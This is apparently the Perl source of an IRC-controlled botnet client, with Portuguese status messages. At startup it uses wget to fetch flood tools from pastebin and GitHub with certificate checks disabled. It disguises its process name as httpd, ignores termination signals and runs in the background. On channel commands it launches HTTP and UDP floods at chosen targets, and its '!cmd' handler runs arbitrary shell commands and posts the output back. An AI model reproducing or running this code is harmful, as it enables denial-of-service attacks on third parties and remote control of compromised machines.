#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "irc.server"; 
my $code = int(rand(100000));
my $channel = "#channel";
my $port    =   "port server";
my $nick    ="[BOT]$code";

unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget http://pastebin.com/raw/vrxtgdj5 -O sadattack.py --no-check-certifcate");
}

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.py -O hulk.py --no-check-certificate");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py -O goldeneye.py --no-check-certificate");
}

unless (-e "udp1.pl") { 
  print "[*] Instalando UDPFlooder... ";
  system("wget http://pastebin.com/raw/zYxkjgvR -O udp1.pl");
}
all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";
      }

     if ( $log =~ m/:!sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1SADATTACK14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stophulk \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:!stopsad/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1SADATTACK14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f sadattack");
      }

      if ( $log =~ m/:!hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stophulk \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:!gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stopgold \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:!stopgold/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:!udp (.*)$/g ){##########
        my $target_udp = $1;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1UDP14,01 ]04,01 Atacando14,0108,01 $104,01 Para cancelar o ataque14,01:08,01 !stopudp04,01 \r\n";
        system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:!stopudp/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1UDP14,01 ]04,01 Ataque finalizado! \r\n";
        system("pkill -9 -f udp1");
      }

      if ( $log =~ m/:!cmd (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);

        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :14,1[ 15,1CMD14,01 ]04,01 Output14,01 => $comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
